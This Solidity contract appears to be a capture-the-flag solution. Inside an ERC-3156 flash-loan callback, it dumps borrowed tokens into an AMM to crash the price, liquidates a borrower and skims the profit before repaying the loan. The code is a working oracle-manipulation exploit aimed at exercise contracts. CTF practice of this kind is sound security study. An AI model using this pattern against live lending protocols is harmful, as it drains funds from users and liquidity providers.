// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../FlashLoanCTF/Flashloan.sol";
import "../FlashLoanCTF/AMM.sol";
import "../FlashLoanCTF/Lending.sol";
import "../FlashLoanCTF/CollateralToken.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract FlashLoanAttack is IERC3156FlashBorrower {
    AMM public immutable amm;
    Lending public lenderContract;
    CollateralToken public collateral;
    address public lender;
    address public borrower;

    constructor(address _amm, address _lender_contract, address _collateral, address _lender, address _borrower) {
        amm = AMM(payable(_amm));
        lenderContract = Lending(payable(_lender_contract));
        collateral = CollateralToken(_collateral);
        lender = _lender;
        borrower = _borrower;
    }

    function attack() external payable {}

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Step 1: Approve AMM to take tokens
        collateral.approve(address(amm), amount);
        collateral.transfer(address(amm), amount);

        // Step 2: Dump all 500 tokens into AMM to crash price
        amm.swapLendTokenForEth(address(this));

        // Step 3: Liquidate the borrower
        lenderContract.liquidate(borrower);
        // Step 4: Convert ETH back to tokens using AMM
        amm.swapEthForLendToken{value: address(this).balance}(address(this));
        // Step 4: Transfer all stolen tokens to the lender
        uint256 profit = collateral.balanceOf(address(this)) - amount - fee;
        collateral.transfer(lender, profit);

        // Step 5: Repay flash loan
        collateral.approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    receive() external payable {}
}
